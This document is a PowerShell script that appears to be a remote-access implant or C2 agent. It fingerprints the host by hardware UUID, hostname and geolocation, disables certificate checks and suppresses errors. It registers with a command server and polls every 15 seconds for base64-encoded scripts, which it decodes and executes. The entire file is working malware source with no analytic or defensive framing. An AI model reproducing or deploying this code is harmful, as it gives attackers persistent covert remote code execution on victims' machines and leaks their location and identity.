$global:ip_port = "127.0.0.1:5000"
$global:id = get-wmiobject Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID
$global:ping_timer = 15
$global:job_timeout = 10

#network vars
$global:countrycode = ""
$global:lat = ""
$global:lon = ""

$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = 'SilentlyContinue'

[System.Net.ServicePointManager]::SecurityProtocol = "Tls, Tls11, Tls12, Ssl3"

class TrustAllCertsPolicy : System.Net.ICertificatePolicy {[bool] CheckValidationResult([System.Net.ServicePoint] $a,[System.Security.Cryptography.X509Certificates.X509Certificate] $b,[System.Net.WebRequest] $c,[int] $d) {return $true}}
[System.Net.ServicePointManager]::CertificatePolicy = [TrustAllCertsPolicy]::new()

function Get-Info {
    if ($global:countrycode -eq "" -or $global:lat -eq "" -or $global:lon -eq "") {
        $req = Invoke-WebRequest -Uri "http://ip-api.com/json" -useb
        if ($req.StatusCode -eq 200) {
            $global:countrycode = ($req.Content | ConvertFrom-Json).countryCode
            $global:lat = ($req.Content | ConvertFrom-Json).lat
            $global:lon = ($req.Content | ConvertFrom-Json).lon
        } else {
            Start-Sleep -Seconds 100
            Get-Info
        }
    }

    $jsonData = @{
        "PCINFO" = @{
            'hwid' = $global:id
            'country_code' = $global:countrycode
            'hostname' = $env:COMPUTERNAME
            'date' = (Get-Date).ToString()
            'lat' = $global:lat
            'lon' = $global:lon
        }
    }

    return $jsonData
}

function Main {
    Invoke-InitialConnection
    while ($true) {
        #ClearPowershell
        #ClearJobs
        Invoke-CheckForCommands
        Start-Sleep -Seconds $global:ping_timer
    }
}

function LoadScript {
    param (
        [String]$base64_script
    )

    try {
        $block = [Scriptblock]::Create([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64_script)))
        
        $started_job = Start-Job -ScriptBlock $block -ArgumentList $global:ip_port, $global:id | Wait-Job -Timeout $global:job_timeout
    }
    catch {
    }
}


function Invoke-InitialConnection {
    $went_through = $false
    while ($went_through -eq $false) {
        $jsonData = Get-Info | ConvertTo-Json
        $base64_id = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($global:id))

        try {
            $req = Invoke-WebRequest -Uri "https://$global:ip_port/api/client/$base64_id" -Method POST -Body $jsonData -ContentType "application/json" -UseBasicParsing -ErrorAction Stop

            if ($req.StatusCode -eq 200) {
                $went_through = $true
                $outData = $req.Content | ConvertFrom-Json

                if ($outData.new_run -eq $true -and $outData.scripts.Count -gt 0) {
                    foreach ($script in $outData.scripts) {
                        LoadScript -base64_script $script
                    }
                }

                if ($outData.user_type -eq "new" -and $outData.auto_load -eq $true -and $outData.auto_load_script.Count -gt 0) {
                    foreach ($script in $outData.auto_load_script) {
                        LoadScript -base64_script $script
                    }
                }
            }
        }
        catch {
            Start-Sleep -Seconds 10
        }
    }
}


function Invoke-CheckForCommands {
    $base64_id = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($global:id))
    
    try {
        $req = Invoke-WebRequest -Uri "https://$global:ip_port/api/client/$base64_id" -Method GET -UseBasicParsing -ErrorAction Stop
        
        if ($req.StatusCode -eq 200) {
            $outData = $req.Content | ConvertFrom-Json

            if ($outData.new_run -eq $true -and $outData.scripts.Count -gt 0) {
                foreach ($script in $outData.scripts) {
                    LoadScript -base64_script $script
                }
            }
        }
    }
    catch {
    }
}

function ClearPowershell {
    #Get-Process powershell -ErrorAction SilentlyContinue | ForEach-Object { if ($pid -ne $_.ID) { Stop-Process -Force -Id $_.ID } }
}

function ClearJobs {
    Get-Job | Remove-Job -Force
}

Main